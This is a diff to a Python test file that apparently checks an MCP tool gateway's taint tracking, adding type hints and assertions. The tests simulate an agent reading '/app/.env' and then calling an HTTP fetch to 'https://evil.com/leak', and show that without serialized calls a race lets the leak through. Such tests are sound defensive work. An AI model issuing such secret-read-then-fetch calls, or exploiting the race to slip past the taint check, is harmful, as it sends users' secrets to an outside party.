@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import asyncio
 from pathlib import Path
+from typing import Any
 from unittest.mock import AsyncMock
 
 import mcp.types as types
@@ -84,7 +85,9 @@ async def test_serialized_calls_prevent_egress_race(tmp_path: Path) -> None:
         "http": AsyncMock(is_healthy=True),
     }
 
-    async def fake_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
+    async def fake_call(
+        server_name: str, tool_name: str, arguments: dict[str, Any] | None = None, **kwargs: Any
+    ) -> types.CallToolResult:
         if server_name == "fs":
             await asyncio.sleep(0.05)  # Simulate small delay during secret read
             return types.CallToolResult(
@@ -106,10 +109,10 @@ async def test_serialized_calls_prevent_egress_race(tmp_path: Path) -> None:
     )
 
     # Launch 1 secret read and 10 parallel fetch calls simultaneously
-    async def run_tainting_call():
+    async def run_tainting_call() -> types.CallToolResult:
         return await session.call_tool("fs__read_file", {"path": "/app/.env"})
 
-    async def run_egress_call(idx: int):
+    async def run_egress_call(idx: int) -> types.CallToolResult:
         await asyncio.sleep(0.01)  # Stagger slightly so tainting call acquires lock first
         return await session.call_tool("http__fetch", {"url": f"https://evil.com/leak?i={idx}"})
 
@@ -142,7 +145,9 @@ async def test_no_deadlock_under_task_cancellation(tmp_path: Path) -> None:
     upstream = AsyncMock(spec=UpstreamManager)
     upstream.servers = {"fs": AsyncMock(is_healthy=True)}
 
-    async def slow_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
+    async def slow_call(
+        server_name: str, tool_name: str, arguments: dict[str, Any] | None = None, **kwargs: Any
+    ) -> types.CallToolResult:
         await asyncio.sleep(1.0)
         return types.CallToolResult(content=[types.TextContent(type="text", text="slow")])
 
@@ -165,7 +170,9 @@ async def test_no_deadlock_under_task_cancellation(tmp_path: Path) -> None:
         await task
 
     # Session lock must be free; a quick call should succeed immediately
-    async def fast_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
+    async def fast_call(
+        server_name: str, tool_name: str, arguments: dict[str, Any] | None = None, **kwargs: Any
+    ) -> types.CallToolResult:
         return types.CallToolResult(content=[types.TextContent(type="text", text="fast")])
 
     upstream.call_tool.side_effect = fast_call
@@ -175,6 +182,7 @@ async def test_no_deadlock_under_task_cancellation(tmp_path: Path) -> None:
         timeout=1.0,
     )
     assert not quick_res.is_error
+    assert isinstance(quick_res.content[0], types.TextContent)
     assert quick_res.content[0].text == "fast"
 
 
@@ -196,7 +204,9 @@ async def test_unserialized_calls_demonstrate_race_window(tmp_path: Path) -> Non
     http_in_flight = asyncio.Event()
     finish_fs = asyncio.Event()
 
-    async def fake_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
+    async def fake_call(
+        server_name: str, tool_name: str, arguments: dict[str, Any] | None = None, **kwargs: Any
+    ) -> types.CallToolResult:
         if server_name == "fs":
             fs_in_flight.set()
             await finish_fs.wait()
@@ -237,4 +247,5 @@ async def test_unserialized_calls_demonstrate_race_window(tmp_path: Path) -> Non
     assert not res1.is_error
     # When serialize_calls is false, the race window allows res2 to succeed before taint update finished
     assert not res2.is_error
+    assert isinstance(res2.content[0], types.TextContent)
     assert res2.content[0].text == "leaked"
